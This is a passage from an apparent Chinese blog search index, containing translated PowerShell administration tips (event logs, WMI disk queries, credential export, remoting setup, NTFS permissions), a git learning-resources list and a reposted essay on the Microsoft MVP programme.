的反引号来为特殊字符（比如说冒号）转义： $domain = $env:USERDOMAIN $username = $env:USERNAME &quot;$username`: located in domain $domain&quot; 如果问题不是由于特殊字符引起的，那么这种方法没有作用： &quot;Current Background Color: $host.UI.RawUI.BackgroundColor&quot; 语法高亮提示双引号引起来的字符串中只解析出了变量，而其它部分（变量名之后的部分，比如说对象的属性）并没有解析出来。 要解决这个问题，您需要使用以下的方法之一： &quot;Current Background Color: $($host.UI.RawUI.BackgroundColor)&quot; 'Current Background Color: ' + $host.UI.RawUI.BackgroundColor 'Current Background Color: {0}' -f $host.UI.RawUI.BackgroundColor","link":"/2014/02/26/expanding-variables-in-strings/"},{"title":"PowerShell 技能连载 - 用 Select-Object -First 节省时间！","text":"Select-Object 命令有一个 -First 参数，接受一个数字值。它将只返回前 x 个元素。听起来挺简单的，而且它的确就这么简单。 以下代码从您的 Windows 文件夹中获取前 4 个 PowerShell 脚本： 从 PowerShell 3.0 开始，-First 不仅选择指定数量的结果，而且它还通知管道的上游命令，告知它操作已完成，有效地中止管道操作。 所以如果您想得到某个命令一定数量的结果，那么您总是可以使用 Select-Object -First x ——在特定的场景里这可以显著地加速您的代码执行效率。 我们假设您需要在您的用户文件夹之下的某个地方找一个名为“test.txt”的文件，并且假设只有一个这个名字的文件。而您只是不知道它放在哪个位置，那么您可以使用 Get-ChildItem 和 -Recurse 来递归查找所有的文件夹： Get-ChildItem -Path $home -Filter test.txt -Recurse -ErrorAction SilentlyContinue 当您执行这段代码时，Get-ChildItem 最终将找到您的文件——并且继续搜索您的文件夹树，也许要持续几分钟才能找完。因为它不知道是否有其它的文件。 所以，您知道的，如果您事先确定结果的数量，那么试试以下的代码： Get-ChildItem -Path $home -Filter test.txt -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 这一次，Get-ChildItem 将会在找到一个文件后立即停止。","link":"/2014/02/27/save-time-with-select-object-first/"},{"title":"PowerShell 技能连载 - 为对象增加信息","text":"有时会遇到这样的需求：需要向命令的执行结果增加额外的信息。也许您从不同的机器获取信息，并且希望保存数据来源的引用。或者，您也许希望增加一个日期，以便知道数据是何时创建的。 向对象附加信息（增加额外的信息列）是很简单的。这段代码将为一个服务列表增加新的“SourceComputer”属性以及日期。 Get-Service | Add-Member -MemberType NoteProperty -Name SourceComputer -Value $env:COMPUTERNAME -PassThru | Add-Member -MemberType NoteProperty -Name Date -Value (Get-Date) -PassThru | Select-Object -Property Name, Status, SourceComputer, Date 请记着您新增的属性需要在使用 Select-Object 以及显式地要求显式它们的时候，才会在结果中显示出来。","link":"/2014/02/28/tag-your-objects-with-additional-information/"},{"title":"PowerShell 技能连载 - 担心隐藏的输入密码请求","text":"您可以在任何主机上运行 PowerShell，powershell.exe 和 powershell_ise.exe 随着 Windows 发布。比起简单的 PowerShell 控制台，许多人更喜欢图形化的 ISE 编辑器。 一旦您开始使用控制台程序，您必须意识到 ISE 编辑器没有真实的控制台。在 ISE 编辑器中，任何时候一个控制台程序想要与您互动时，它将会运行失败。 所以 choice.exe 在控制台中工作正常，但是您在 ISE 编辑器中运行相同的命令时，却没有办法使 choice.exe 接收您的按键。 有些时候，这可能会导致意外的结果。当您在 ISE 编辑器中运行 driverquery.exe 加上 /S Servername 参数从远程系统中读取驱动器信息时，编辑器会假死。 当您在控制台中运行相同的命令时，您会知道原因：driverquery.exe 可能会显示一个提示并期望输入密码。ISE 编辑器无法处理这个提示和您的输入——由于它没有控制台缓冲区。 所以当您的脚本用到了控制台应用程序时，您最好在传统的 PowerShell 控制台中运行它们。","link":"/2014/03/03/beware-of-hidden-password-requests/"},{"title":"PowerShell 技能连载 - 消除重复","text":"Sort-Object 有一个很棒的特性：使用 -Unique 参数，您可以移除重复对象： 这也可以用于对象类型的结果。请看这个例子，它将从您的系统事件日志中获取最后的 40 条错误： 它的结果也许完全正确，但是您实际上可能得到很多重复的条目。 通过使用 -Unique 参数，您可以基于多个属性消除重复的结果： 这样，您再也看不到多于一条具有相同 InstanceID 和 消息的结果了。 您可以再次对结果排序，以使得结果按时间排序。 所以结论是：Sort-Objects 的 -Unique 参数可以一次性应用到多个属性上。","link":"/2014/03/04/eliminating-duplicates/"},{"title":"PowerShell 技能连载 - 轻松地格式化数字","text":"用户常常需要格式化数字并且限制小数的位数，或者是在左侧补零。有一个简单标准的方法：使用操作符 -f ！ 以下代码的作用是左侧补零： $number = 68 '{0:d7}' -f $number 这段代码将生成一个左补零的 7 位数字。调整“d”后的数字可以控制位数。 要限制小数的位数，请使用“n”来代替“d”。这一次，“n”后的数字控制小数的位数： $number = 35553568.67826738 '{0:n1}' -f $number 类似地，用“p”来格式化百分比： $number = 0.32562176536 '{0:p2}' -f $number","link":"/2014/03/05/formatting-numbers-easily/"},{"title":"PowerShell 技能连载 - 字符串左右对齐","text":"如果您需要确保给定的字符串有一致的宽度，那么您可以使用 .NET 方法来适当地对齐字符串： $mytext = 'Test' $paddedText = $mytext.PadLeft(15) &quot;Here is the text: '$paddedText'&quot; $paddedText = $mytext.PadRight(15) &quot;Here is the text: '$paddedText'&quot; 以下是结果： 您甚至可以自己指定补充的字符（如果您不想使用空格来补的话）：","link":"/2014/03/06/padding-strings-left-and-right/"},{"title":"PowerShell 技能连载 - 自动连接到公共热点","text":"许多手机服务提供商在机场和公共场所提供公共热点。要连接热点，您往往需要浏览一个登录页面，然后手动输入您的凭据。 以下是一个自动做以上事情的脚本。它在 t-mobile.de 运营商环境下调是通过。但是您可以调整脚本以适应其它的运营商。 function Start-Hotspot { param ( [System.String] $Username = 'XYZ@t-mobile.de', [System.String] $Password = 'topsecret' ) # change this to match your provider logon page URL $url = 'https://hotspot.t-mobile.net/wlan/start.do' $r = Invoke-WebRequest -Uri $url -SessionVariable fb $form = $r.Forms[0] # change this to match the website form field names: $form.Fields['username'] = $Username $form.Fields['password'] = $Password # change this to match the form target URL $r = Invoke-WebRequest -Uri ('https://hotspot.t-mobile.net' + $form.Action) -WebSession $fb -Method POST -Body $form.Fields Write-Host 'Connected' -ForegroundColor Green Start-Process 'http://www.google.de' } 简而言之，Invoke-WebRequest 可以到导航到一个页面，填充表单数据，然后提交表单。要能提交正确的数据，您需要查看登录网页的的源代码（导航到该页面，在浏览器中右键单击选择显示 HTML 源代码）。 然后，识别出您希望填充的表单，然后将脚本代码中的表单名称和动作改为您从 HTML 代码中识别出来的值。","link":"/2014/03/07/auto-connecting-with-public-hotspot/"},{"title":"PowerShell 技能连载 - 查找一个时间点附近的日志","text":"经常地，您会需要浏览某个指定日期附近的所有系统事件。我们假设某台机器在 08:47 崩溃了，您需要查看该时间前后 2 分钟之内的事件。 以下是一个完成以上任务的脚本： $deltaminutes = 2 $delta = New-TimeSpan -Minutes $deltaminutes $time = Read-Host -Prompt 'Enter time of event (yyyy-MM-dd HH:mm:ss or HH:mm)' $datetime = Get-Date -Date $time $start = $datetime - $delta $end = $datetime + $delta $result = @(Get-EventLog -LogName System -Before $end -After $start) $result += Get-EventLog -LogName Application -Before $end -After $start $result | Sort-Object -Property TimeGenerated -Descending | Out-GridView -Title &quot;Events +/− $deltaminutes minutes around $datetime&quot; 当您运行它时，它需要用户输入一个时间或日期 + 时间值。然后，您可以获得该时间点前后 2 分钟之内系统和应用程序日志中的所有事件。 如果您没有获取到任何数据，那么说明在这段时间段中没有任何事件。 这段代码示范了您可以获取一个时间段之内的事件，并且示范了如何查询多个事件日志。","link":"/2014/03/09/finding-events-around-a-date/"},{"title":"PowerShell 技能连载 - 导出数据到 Excel","text":"您可以轻松地在 PowerShell 中将对象数据转化为 CSV 文件。以下代码生成当前进程的 CSV 报告： 要在 Microsoft Excel 中打开 CSV 文件，您可以使用 Invoke-Item 来打开文件，但是这仅当您的 CSV 文件扩展名确实关联到 Excel 应用程序的时候才有效。 以下代码将确保在 Microsoft Excel 中打开 CSV 文件。它展示了一种超出您 Excel 应用（假设它已经安装了，并且无须检测它是否存在）的方法： $report = &quot;$env:temp\\report.csv&quot; $ExcelPath = 'C:\\Program Files*\\Microsoft Office\\OFFICE*\\EXCEL.EXE' $RealExcelPath = Resolve-Path -Path $ExcelPath | Select-Object -First 1 -ExpandProperty Path &amp; $RealExcelPath $report","link":"/2014/03/11/exporting-data-to-excel/"},{"title":"PowerShell 技能连载 - 查找昨天以来的错误","text":"要获取一个时间段内的数据，相对日期的作用十分重要，它能避免硬编码日期和时间值。 这段代码将会从系统日志中获取昨天起（24 小时以内）的所有错误和警告事件： $today = Get-Date $1day = New-TimeSpan -Days 1 $yesterday = $today - $1day Get-EventLog -LogName system -EntryType Error, Warning -After $yesterday","link":"/2014/03/12/finding-errors-since-yesterday/"},{"title":"PowerShell 技能连载 - 查找空闲容量低的硬盘驱动器","text":"可以通过 WMI 轻松地获取驱动器信息。以下代码可以从您的本地计算机中获取驱动器信息（用 -ComputerName 可以存取远程系统的信息）。 要限制结果只包含硬盘驱动器，并且只包含空闲容量低于指定值的硬盘驱动器，请试试以下代码： $limit = 80GB Get-WmiObject -Class Win32_LogicalDisk -Filter &quot;DriveType=3 and Freespace&lt;$limit&quot; | Select-Object -Property VolumeName, Freespace, DeviceID","link":"/2014/03/13/finding-hard-drives-running-low-on-storage/"},{"title":"PowerShell 技能连载 - 以 GB 和百分比的形式显示驱动器容量","text":"当一个 cmdlet 返回原始数据时，您可能希望将数据转换为一个更好的格式。例如，WMI 可以汇报驱动器的剩余空间，但是是以字节为单位的。 您可以使用 Select-Object 并且传入一个哈希表来将原始数据转换为您希望的格式。这个例子演示了如何将剩余空间转换为以 GB 为单位，并且计算剩余空间的百分比： $Freespace = @{ Expression = {[int]($_.Freespace/1GB)} Name = 'Free Space (GB)' } $PercentFree = @{ Expression = {[int]($_.Freespace*100/$_.Size)} Name = 'Free (%)' } Get-WmiObject -Class Win32_LogicalDisk | Select-Object -Property DeviceID, VolumeName, $Freespace, $PercentFree 以下是不使用哈希表的结果： 这是使用了哈希表的结果：","link":"/2014/03/14/drive-data-in-gb-and-percent/"},{"title":"PowerShell 技能连载 - 查找无线网卡","text":"有很多方法可以查找网卡，但似乎没有办法识别活动的无线网卡。 您网卡的所有信息都可以在注册表中找到，以下是一个单行的代码，可以提供您想要的信息： 有趣的部分是 MediaSubType 值。无线网卡的 MediaSubType 值总是 2。 所以这行代码只返回无线网卡：","link":"/2014/03/17/finding-wireless-network-adapters/"},{"title":"PowerShell 技能连载 - 获取无线网卡","text":"在上一个技巧中，我们演示了如何使用注册表信息来查找无线网卡。以下是一个可以返回您系统中所有无线网卡的 Get-WirelessAdapter 函数： function Get-WirelessAdapter { Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Network\\*\\*\\Connection' -ErrorAction SilentlyContinue | Select-Object -Property MediaSubType, PNPInstanceID | Where-Object { $_.MediaSubType -eq 2 -and $_.PnpInstanceID } | Select-Object -ExpandProperty PnpInstanceID | ForEach-Object { $wmipnpID = $_.Replace('\\', '\\\\') Get-WmiObject -Class Win32_NetworkAdapter -Filter &quot;PNPDeviceID='$wmipnpID'&quot; } } 只需要运行该函数： 由于该函数返回一个 WMI 对象，所以您可以获知该网卡当前是否是活动的，或者启用禁用它。 以下代码将取出网卡对象，然后禁用它，再启用它： $adapter = Get-WirelessAdapter $adapter.Disable().ReturnValue $adapter.Enable().ReturnValue 请注意返回值 5 意味着您没有足够的权限。请以管理员身份运行该脚本。","link":"/2014/03/18/get-wirelessadapter/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中提升命令权限","text":"有些时候，一个脚本需要运行一个需提升（管理员）权限的命令。 一种方法是将用管理员权限运行整个脚本，另一种方法是将独立的命令送到提升权限的 shell 中执行。 这段代码将重启 Spooler 服务（需要提升权限），并将命令发送到另一个 PowerShell 进程中。如果当前进程没有管理员权限，它将自动提升权限。 $command = 'Restart-Service -Name spooler' Start-Process -FilePath powershell.exe -ArgumentList &quot;-noprofile -command $Command&quot; ` -Verb runas","link":"/2014/03/19/running-commands-elevated-in-powershell/"},{"title":"PowerShell 技能连载 - 获取系统信息","text":"如果您只是需要获取本地系统或远程系统的常见配置信息，那么不必浪费时间去研究自己的解决方案。只需要使用 systeminfo.exe，然后将数据导入 PowerShell： function Get-SystemInfo { param($ComputerName = $env:COMPUTERNAME) $header = 'Hostname','OSName','OSVersion','OSManufacturer','OSConfiguration','OS Build Type','RegisteredOwner','RegisteredOrganization','Product ID','Original Install Date','System Boot Time','System Manufacturer','System Model','System Type','Processor(s)','BIOS Version','Windows Directory','System Directory','Boot Device','System Locale','Input Locale','Time Zone','Total Physical Memory','Available Physical Memory','Virtual Memory: Max Size','Virtual Memory: Available','Virtual Memory: In Use','Page File Location(s)','Domain','Logon Server','Hotfix(s)','Network Card(s)' systeminfo.exe /FO CSV /S $ComputerName | Select-Object -Skip 1 | ConvertFrom-CSV -Header $header } 以下是结果： 如果把结果保存到一个变量，您可以很容易地独立存取里面的每一条信息： 如果您想用别的名字来获取信息，只需根据需要改变属性名列表。例如您不喜欢“System Boot Time”，那么只需要在脚本中将它重命名为“BootTime”。","link":"/2014/03/20/profiling-systems/"},{"title":"PowerShell 技能连载 - 应用 NTFS 存取权限","text":"有很多方法可以增加或修改 NTFS 权限。其中一个方法是复用现成的工具，例如 icacls.exe。 这个函数将以缺省权限创建新的文件夹。该脚本使用 icacls.exe 来显式地为当前用户添加完全权限以及为本地管理员添加读取权限： function New-Folder { param ( [String] $path, [String] $username = &quot;$env:userdomain\\$env:username&quot; ) If ( (Test-Path -Path $path) -eq $false ) { New-Item $path -Type Directory | Out-Null } icacls $path /inheritance:r /grant '*S-1-5-32-544:(OI)(CI)R' ('{0}:(OI)(CI)F' -f $username) }","link":"/2014/03/21/applying-ntfs-access-rules/"},{"title":"用一句话定义 PowerShell","text":"摘要：微软脚本小子 Ed Wilson，提供了对 Windows PowerShell 的一句话描述，并且证明了它不超过 30 个单词。 问：如何用一句话定义 Windows PowerShell？ 答：Windows PowerShell 是微软公司开发的下一代命令行和脚本语言，它在多数环境下可以替代 vbscript 和 cmd 命令行。 问：您如何确定这句话不超过 30 个单词？ 答：用以下代码： $a = &quot;Windows PowerShell is the next generation cmd prompt and scripting language from Microsoft. It can be a replacement for vbscript and for the cmd prompt in most circumstances.&quot; Measure-Object -InputObject $a -Word 原文： PowerTip: Define PowerShell in Thirty Words or LessSummary: Microsoft Scripting Guy, Ed Wilson, offers a quick thirty-word description of Windows PowerShell, and he proves it. Q: What is Windows PowerShell in thirty words or less? A: Windows PowerShell is the next generation cmd prompt and scripting language from Microsoft. It can be a replacement for vbscript and for the cmd prompt in most circumstances. Q: How can you be sure that was thirty words or less? A: By using the following code: $a = &quot;Windows PowerShell is the next generation cmd prompt and scripting language from Microsoft. It can be a replacement for vbscript and for the cmd prompt in most circumstances.&quot; Measure-Object -InputObject $a -Word 本文国际来源","link":"/2014/03/23/define-powershell-in-thirty-words-or-less/"},{"title":"PowerShell 技能连载 - 传递参数给 EXE 文件","text":"从 PowerShell 运行某些应用程序，例如 robocopy.exe 不是很方便。如何向 EXE 传递参数，并且确保通过 PowerShell 不会传错值呢？ 方法很简单：确保所有的参数是字符串（所以如果参数不是字符串或包含其它特殊字符，那么用双引号把它们包起来）。并且，确保针对每个参数提交一个字符串，而不是单个大字符串。 以下代码将从 PowerShell 执行 robocopy.exe 并且递归地从 Windows 文件夹中拷贝所有的 JPG 图片到另一个 c:\\jpegs 文件夹中，遇到错误不重试，并跳过 winsxs 文件夹。 $arguments = &quot;$env:windir\\&quot;, 'c:\\jpegs\\','*.jpg', '/R:0', '/S', '/XD', '*winsxs*' Robocopy.exe $arguments 如您所见，所有的参数都是字符串，并且它们都以一个字符串数组的形式传递。 这种方法完美地运行于所有您希望通过 PowerShell 调用的 exe 程序。","link":"/2014/03/24/submitting-arguments-to-exe-files/"},{"title":"git 学习路线","text":"Git是一个开源的分布式版本控制系统，用以有效、高速的处理从很小到非常大的项目版本管理。 链接 Git - git 官网 Git for Windows - Windows 版的 git 命令行客户端 Git Client smartGit - 跨平台的图形化 git 客户端，可免费非商业使用。 教程 Git教程 - 廖雪峰的官方网站 git命令和smartgit使用介绍 《Git详解》系列 Git详解之一 Git起步 Git详解之二 Git基础 Git详解之三 Git分支 Git详解之四 服务器上的Git Git详解之五 分布式Git Git详解之六 Git工具 Git详解之七 自定义Git Git详解之八 Git与其他系统 Git详解之九 Git内部原理 《Git Step by Step》系列 Git Step by Step – (1) Git 简介 Git Step by Step – (2) 本地Repo Git Step by Step – (3) Git对象模型 Git Step by Step – (4) 探索.git目录 Git Step by Step – (5) Git分支(branch) Git Step by Step – (6) Git远程仓库 Git Step by Step – (7) Git远程仓库（续） Git Step by Step – (8) Git的merge和rebase gitflow 介绍一个成功的 Git 分支模型 http://nvie.com/files/Git-branching-model.pdf","link":"/2015/03/25/Guideline-to-Learn-git/"},{"title":"PowerShell 技能连载 - 查找过期的证书","text":"PowerShell 通过 cert: 驱动器来存取您的证书存储。 您可以根据指定的规则用这个驱动器来查找证书。以下代码将列出所有 NotAfter 字段中有值并在今日之前（意味着证书已过期）的证书： $today = Get-Date Get-ChildItem -Path cert:\\ -Recurse | Where-Object { $_.NotAfter -ne $null } | Where-Object { $_.NotAfter -lt $today } | Select-Object -Property FriendlyName, NotAfter, PSParentPath, Thumbprint | Out-GridView","link":"/2014/03/25/finding-expired-certificates/"},{"title":"PowerShell 技能连载 - 获取时间服务器（以及读取所有注册表键值）","text":"也许您希望从注册表数据库中获取已登记的时间服务器列表。他们您可能需要运行类似这样的代码： Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers' $path = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\Servers' $key = Get-Item -Path $path Foreach ($valuename in $key.GetValueNames()) { if ($valuename -ne '') { $key.GetValue($valuename) } } 这段代码存取注册表键，然后使用它的方法来获取值的名称，然后取出值：","link":"/2014/03/26/finding-time-servers-and-reading-all-regkey-values/"},{"title":"PowerShell 技能连载 - 查找 U 盘信息","text":"您知道吗，Windows 记录了您使用过的所有 U 盘信息。要从注册表中读取上述信息，只需要使用这个函数： function Get-USBInfo { param ( $FriendlyName = '*' ) Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*\\' | Where-Object { $_.FriendlyName } | Where-Object { $_.FriendlyName -like $FriendlyName } | Select-Object -Property FriendlyName, Mfg | Sort-Object -Property FriendlyName } 以下是输出的例子： 您还可以按厂商来查询：","link":"/2014/03/27/finding-usb-stick-information/"},{"title":"PowerShell 技能连载 - 用 PowerShell 导入导出凭据","text":"凭据对象包含了用户名和密码。您可以用 Get-Credential 来创建它们，然后将该对象传递给任何包含 -Credential 参数的 cmdlet。 然而，您要怎么做才能不需要用户干预，并且确保安全呢？您不希望弹出一个凭据对话框，并且您不希望在脚本中保存密码信息的话。 以下是一个解决方案：使用 Export-Credential 函数将凭据保存到一个文件中： function Export-Credential { param ( [Parameter(Mandatory=$true)] $Path, [System.Management.Automation.Credential()] [Parameter(Mandatory=$true)] $Credential ) $CredentialCopy = $Credential | Select-Object * $CredentialCopy.Password = $CredentialCopy.Password | ConvertFrom-SecureString $CredentialCopy | Export-Clixml $Path } 这段代码将 tobias 用户的凭据保存到一个文件中： 请注意当您进行这步操作时，将弹出凭据对话框并以安全的方式询问您的密码。该输出的文件包含 XML，并且密码是加密的。 现在，当您需要凭据时，使用 Import-Credential 来从文件中取回它： function Import-Credential { param ( [Parameter(Mandatory=$true)] $Path ) $CredentialCopy = Import-Clixml $path $CredentialCopy.password = $CredentialCopy.Password | ConvertTo-SecureString New-Object system.Management.Automation.PSCredential($CredentialCopy.username, $CredentialCopy.password) } 使用方法如下： 加密解密的“奥秘”在于您的身份，所以只有您（导出凭据的用户）可以将它再次导入。无需在您的脚本中硬编码隐私信息。","link":"/2014/03/28/exporting-and-importing-credentials-in-powershell/"},{"title":"PowerShell 技能连载 - 启用传统远程控制","text":"许多 cmdlet 有内置的远程功能，例如 Get-Service 和 Get-Process 都具有 -ComputerName 参数，同样的还有 Get-WmiObject。 然而，要真正地远程使用这些 cmdlet，还需要一些先决条件。多数使用传统远程技术的 cmdlet 需要在目标机器上启用“远程管理”防火墙规则。它允许 DCOM 通信。还有一些需要目标计算机运行远程注册表服务。 所以在多数场景中，当您拥有目标机器的管理员，并且运行以下命令，则管理员可以通过传统远程 cmdlet 访问目标机器： 注意新版的 Windows 中 netsh firewall 命令可能会被废弃，不过目前仍然可以用。该命令比新版的 netsh advfirewall 命令用起来更简单。","link":"/2014/03/31/enabling-classic-remoting/"},{"title":"PowerShell 技能连载 - 启用 PowerShell 远程管理","text":"如果您希望用 PowerShell 远程管理来执行另一台机器上的命令或脚本，那么您需要以完整管理员权限启用目标机器上的远程管理功能： 在客户端，当您在同一个域中并且使用同一个域用户登录时，您不需要做任何额外的事情。 如果您希望通过非 Kerberos 验证方式连接目标计算机时（目标计算机在另一个域中，或您希望使用 IP 地址或非完整限定 DNS 名来连接），那么您需要以管理员权限运行一次以下代码： 将信任的主机设置为“*”之后，PowerShell 将允许您连接任何 IP 或机器名，如果无法用 Kerberos 验证身份，将使用 NTLM 验证。所以该设置不影响哪些人可以和该主机通信（通过防火墙规则设置）。它只是告诉 PowerShell 您将在 Kerberos 不可用的时候使用（更不安全一些的）NTLM 验证方式。NTLM 更不安全一些，因为它无法知道目标计算机是否真的是您想要访问的计算机。Kerberos 认证有相互认证过程，而 NTLM 没有。您的凭据直接被发送到指定的计算机中。假如当一个攻击者有机会用他的机器替换掉目标机器，并且占据了它的 IP 地址，而您使用 NTLM 的话，不会得到任何通知。 注意：如果你打开了远程并设置了信任列表后想关闭远程请运行 Disable-PSRemoting，不禁用远程将可能被人利用。 当远程管理打开以后，您可以通过 Enter-PSSession 访问远程系统，并且您可以用 Invoke-Command 在这些机器上运行命令或脚本。","link":"/2014/04/01/enabling-powershell-remoting/"},{"title":"PowerShell 技能连载 - 验证 UNC 路径","text":"Test-Path 命令可以检测指定的文件或文件夹是否存在。它对于使用盘符的路径工作正常，但是对于纯 UNC 路径则不可用。 最简单的情况下，这应该返回 $true，并且它的确返回了 $true（假设您没有禁用管理员共享）： $path = '\\\\127.0.0.1\\c$' Test-Path -Path $path 现在，同样的代码却返回 $false： Set-Location -Path HKCU:\\ $path = '\\\\127.0.0.1\\c$' Test-Path -Path $path 如果路径不是使用一个盘符，PowerShell 将使用当前路径，如果该路径指向一个非文件系统位置，Test-Path 将在该 provider 的上下文中解析 UNC 路径。由于注册表中没有这个路径，Test-Path 返回 $false。 要让 Test-Path 在 UNC 路径下可靠地工作，请确保您在 UNC 路径之前添加了 FileSystem provider。现在，无论当前位于哪个驱动器路径，结果都是正确的： Set-Location -Path HKCU:\\ $path = 'filesystem::\\\\127.0.0.1\\c$' Test-Path -Path $path","link":"/2014/04/02/testing-unc-paths/"},{"title":"[转] 浅谈Microsoft MVP","text":"微软MVP，这个自1993 年开始在社群上出现的计划(MVP Award Program)，目前在全球已经累积超过5,000 人，其中在台湾已经有一百多人了，包括我在内，这个计画现在已经成为以微软技术为主的技术社群(technology community) 中，最高等级的奖励计画，虽然它是由微软主办，但是它是以社群为主的一个计画，对于在社群中活跃​​但可能不知名的技术高手或是专家们，是一个很具吸引力的计画，因为它除了提供实质性，非金钱价值的奖励以外，还提供了出名的机会（出席研讨会，主持场次，与微软共同推广技术等），所以有很多走微软技术的人都很想拿到它。 不过，据我个人的观察，似乎很多人都 只想拿到它，但却忽略了它背后真正的意义 。 到底什么是MVP ? 微软将MVP 定义为： 微软最有价值专家是微软的一个年度奖项。MVP来自于各行各业，但是他们都有者两个共同点: 精通某一个微软产品或技术领域。 愿意与他人分享技术经验。 在微软，我们视MVP为 最有价值的合作伙伴 。透过奖励，肯定、跟支持这些优秀的技术人员，微软并且和这些重要伙伴保持紧密的联系。 对于社群来说，MVP是一种称号，也是一种地位的象征，它的地位来自于微软官方的认可，但它和MCP Program不同，它是由微软内部针对申请人提交的申请书审查，针对事实来做审核，不像MCP Program被人诟病说用考古题就可以考到一样，它比MCP更具事实上的说服力，而且 当选MVP 大多数的原因是解决问题的数量有一定程度 ，因此解决问题能力强的人，变成MVP的机率就会很高。这也就是为什么MVP会被当成解决问题的专家的原因，毕竟解决问题不像考试那样，考试是在一个给定且没有额外空间可以假设的情况下的解决问题，但在 社群中的问题，多半都和当时的环境相依，且没有固定的答案 ，只有顺利解决问题的才是正解，这和考试有标准答案是差很多的。 因此，MVP除了是一个奖项，称号与名声以外，它也是一种社群责任（community responsibility），针对MVP的主要技术(award technology)而言，MVP必须具备一定水准，且具有低错误率的回答（在社群中）与解决问题（社群与现实环境）的能力，而 这些能力全是厚植于自己的学识与经验，以及对技术的热情。 MVP 所需要的能力 微软在甄选MVP时，会以九种评价目标来评价申请人： 积极参与Microsoft Online Community 线上社群 回答的问题远超过发问的问题 杰出的线上社群表现 大量而精确的回答 在某一领域、产品或开发训练拥有广泛的知识 某一领域或特定产品中知名的专家或「长老」 对Microsoft 抱持中立或是正面的态度 资讯服务的支持者 亲切的客服技巧与态度 一般而言，被考虑授予Microsoft MVP地位的人员，在这九项甄选条件中至少要具备四项。特别要强调的是，这是一项目标，而不是标准。最后，Microsoft MVP能够就Microsoft技术在群组中展现重大成就并提供重大支援的候选人会优先列入考量。他们为所属社群(尤其是Microsoft新闻群组、网站、清单服务、留言板等线上存取的社群)增添了持续的品质，在了解他们所支援的技术及永远乐于与人分享热忱和专业方面，受到同侪的信任并且被视为领袖。 基于Microsoft的策略、预算限制及方案的公正性，被提名的候选人不可能全部都被授予Microsoft MVP 的身份。换言之，最可能获颁这项殊荣的被提名人，必须在支援社群的影响力方面以明确的评量标准，在「所有」这九项甄选条件中展现足够的实力：例如，在MSNEWS 新闻群组中回应的比例他们自己主持的线上社群(如果有) 服务了多少人他们去年发表演说的免费简报活动(如果有) 有几次、有多少人参与他们志愿主持的使用者群组(如果有) 有哪些直接与间接的影响，等等。到了最后评鉴的时候，每一位候选人都会依据候选人各自的评量标准，以个案方式逐一审核并决定是否授予这项殊荣。这也是每两年一次由各MVP Leads及Microsoft MVP 专案经理与Microsoft 各产品群组及各分公司共同举行的评审程序的一部分。 最后要强调，「MVP方案」的主要目的， 是要透过严格的品质保证专业、公正性和专业精神，在Microsoft社群成员中挑选出「好手中的好手」并且授予这项地位 。 因此，MVP对于技术的要求，便是以能够让社群（不一定是指讨论区）的参与者，认为MVP的申请人是具有一定程度技术水准，并且将他视为**技术领导者(technology leads )**。除了 ​​技术以外，对于技术的热情也是评价条件之一，这也是MVP每年都要重新申请的关系，技术热情与水准如果能够一直延续甚至提升的话，那连选连任也是很正常的，MVP社群中也有连任十几届的。 如何成为MVP，以及MVP 奖励 如果你认为你具有前段所说的那些条件，那么你可以透过下列管道来报名： 毛遂自荐，在台湾微软的社群网站中申请报名表填写，并提交给台湾MVP团队申请。 由微软MVP团队主动发掘，因此如果你收到twmvp@microsoft.com寄来的邮件，可别删掉它，因为可能是MVP报名表（我第一次参与MVP甄选就是由这个管道参加的）。 由其他的MVP 推荐，或由所在的社群团队向微软推荐。 台湾微软每年会以季为单位来开放MVP 甄选的报名，通常是每个的1, 4, 7, 10 四个月，而在当季的MVP 录取名单公布时，随即开始下一季的报名程序，不论你是新科MVP 申请人，还是寻求连任MVP 的申请人，都需要在特定期间报名（连任者会由微软主动通知）。 当选MVP 的申请人，可以得到下列的非金钱价值的奖励： MSDN Premium with Visual Studio Professional或TechNet Plus一年期 免费订阅资格 （这个我想一定是最吸引人的条件，因为它的价值就已经有数十万元了） MVP 证书与奖品（每年都不同，且不论是新任或连任都有）。 MVP logo 的使用权，只有在MVP 当选有效期间才可用。 存取MVP 成员网站，以及MVP Connect Services 的权利。 MVP 具有Microsoft Company Store Online 的$150 美元奖品配额，可自由选择总价值为$150 美元的任何商品。 受邀参与MVP 活动，微软活动，以及每年会办的MVP Global Summit (全球年会)。 可能不定时会收到微软的不同奖项（例如Visual Studio Customer Feedback 贡献奖座等）。 与微软的合作机会，不过这要看你与微软当地子公司的员工的关系与互动。 另外，当选MVP 的申请人都必须要填写一份MVP Non-disclosure agreement (NDA)，以确保MVP 具有保密责任，因为微软会和MVP 交流一些未公开的技术情报，这些都是微软的机密，因此需要透过NDA 来建立微软与MVP 间自由沟通的桥梁。 MVP 迷思与责任 外界看MVP 很有名气，但事实上并非如此。 在社群上，MVP总是被外界投以关切的眼光，同时也被赋与较高的技术期望，外界会特别去要求MVP的解答水准，这在社群上很常见，而对于MVP本身而言，也会不自主的对自己的解答产生责任感，并且会不自觉的提升自己的解答水平，让社群可以更能应用解答的内容，来达成自己需要的东西或完成工作，但MVP也是人，也有不会的地方，因此 MVP不该被视为技术之神（真正的神是无所不知的，但MVP也有不会的地方，因此不能相提并论） ，也不该被赋与超出水准太多的期望。MVP本身则也应该要致力保持技术水准，或是扩大自己的涉猎领域，以整合各种技术来提高解答或解决问题的能力。 另一种很常见的错误认知是， MVP被当作微软的员工，其实MVP不是微软的员工 ，这群人是来自社会各个层面，各自拥有不同的专业技术，但都有相同的热情与对于技术的执着，被微软认可授予称号所组成的，我想有可能是因为MVP经常参与微软活动，论坛或是开课，而让外界对MVP有所误解，不过MVP真的不是微软的员工， MVP可没有进入微软公司的智慧卡，而且MVP去微软仍然要走8F的访客入口…。 我个人在MVP 社群中已经待了六年（2004-2009），时间虽然不够长，但也看了不少来申请MVP 的人们，有可以连任很多次的，但也只有一次就没了的，当然也有申请没被录取的，一样米养百样人，各式各样的人都有，而且每个人对MVP 的看法可能也都不相同，不过我个人认为在MVP 这个团体中，有几个共通点： 